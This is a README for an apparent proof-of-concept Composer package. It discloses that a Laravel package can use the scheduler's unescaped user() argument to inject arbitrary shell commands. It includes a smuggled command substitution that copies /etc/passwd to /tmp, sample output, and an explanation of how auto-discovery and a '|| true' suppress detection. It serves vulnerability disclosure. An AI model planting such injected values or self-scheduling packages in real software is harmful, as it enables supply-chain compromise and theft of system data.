# Laravel - Shell Escape PoC

Proof of Concept to prove Laravel package vendors can exploit the command scheduler to run self-scheduled arbitrary shell commands.

Affecting all Laravel versions above 5.4 (Lumen is untested) when the scheduler `artisan schedule:run` is used.

### Installation
1. [Setup fresh laravel project](https://laravel.com/docs/8.x/installation#installation-via-composer)
```
composer create-project laravel/laravel example-app
```

2. Include this package
```
composer require shell-escape/poc:dev-master
```

_<small>Due to the nature of this package I will not be adding it to packagist.<br/>You will have to add the repository manually https://getcomposer.org/doc/05-repositories.md#repository
</small>_

### Running
```bash
> php artisan schedule:run
Running scheduled command: sudo -u YOURUSER $(cat /etc/passwd > /tmp/really-cool.log || true) -- sh -c ''/usr/bin/php' 'artisan' the:poc > '/dev/null' 2>&1'

Process finished with exit code 0

> cat /tmp/really-cool.log
root:x:0:0::/root:/usr/bin/zsh
bin:x:1:1::/:/usr/bin/nologin
daemon:x:2:2::/:/usr/bin/nologin
mail:x:8:12::/var/spool/mail:/usr/bin/nologin
...
```

`/tmp/really-cool.log` will contain the output of your `/etc/passwd`

### How the exploit works

#### Service Provider auto-discovery
Laravel's package discovery is utilised for the requiring app, to have the package automatically bootstrapped on application boot
> https://laravel.com/docs/8.x/packages#package-discovery

#### Adding the command schedule
As part of the service provider `boot()` is used to have a service resolution callback of the 

`ShellEscapePoc\Console\ExploitingCommand` is registered in a typical manner using the `register()` method.

Part of the schedule registration is to specify an explicit `user()` to use, which is functionality supported by Laravel.
The [CommandBuilder](https://github.com/illuminate/console/blob/465ab9dedd7db3a7ac551315259a5f9f261741f8/Scheduling/CommandBuilder.php#L73) 
is not escaping supplied arguments, given the CommandBuilder generates a command templated from
```
sudo -u $1 -- sh -c $2
```

we're able to seize control by using the shell's scripting language `AND` control operator.

eg.
```
$1 = cat /etc/passwd > /tmp/really-cool.log
$2 = 'the:poc'
```
`$2` must be a real command, registered in the Laravel console Kernel

The service wraps `$1` in a subshell, with an `OR` control operator (`||`) to `true`.
```bash
sudo -u $(cat /etc/passwd > /tmp/really-cool.log || true) -- sh -c the:poc
```
to trick the command runner into thinking the process is always successful.
This is not required, but rather used to hide exit codes other than 0
